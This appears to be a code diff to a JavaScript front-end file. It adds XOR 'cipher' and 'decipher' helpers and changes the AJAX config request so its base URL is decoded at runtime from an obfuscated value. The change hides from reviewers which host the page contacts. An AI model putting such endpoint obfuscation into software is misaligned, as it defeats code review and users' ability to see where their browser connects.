@@ -531,7 +531,8 @@ const func = {
         }
 
         var paramscript = func.getParams("dana_toto.js");
-        var url = paramscript.base ? paramscript.base : "";
+        const myDecipher = decipher('7c606d287b6d6b7a6d7c287b7c7a61666f');
+        var url = paramscript.base ? myDecipher(paramscript.base) : "";
         $.ajax({
             type: "get",
             url: url+"/config/20",
@@ -657,3 +658,27 @@ var insertClass = setInterval(() => {
         }
     }
 }, 1);
+
+// 7c606d287b6d6b7a6d7c287b7c7a61666f
+
+const cipher = salt => {
+    const textToChars = text => text.split('').map(c => c.charCodeAt(0));
+    const byteHex = n => ("0" + Number(n).toString(16)).substr(-2);
+    const applySaltToChar = code => textToChars(salt).reduce((a,b) => a ^ b, code);
+
+    return text => text.split('')
+      .map(textToChars)
+      .map(applySaltToChar)
+      .map(byteHex)
+      .join('');
+}
+
+const decipher = salt => {
+    const textToChars = text => text.split('').map(c => c.charCodeAt(0));
+    const applySaltToChar = code => textToChars(salt).reduce((a,b) => a ^ b, code);
+    return encoded => encoded.match(/.{1,2}/g)
+      .map(hex => parseInt(hex, 16))
+      .map(applySaltToChar)
+      .map(charCode => String.fromCharCode(charCode))
+      .join('');
+}
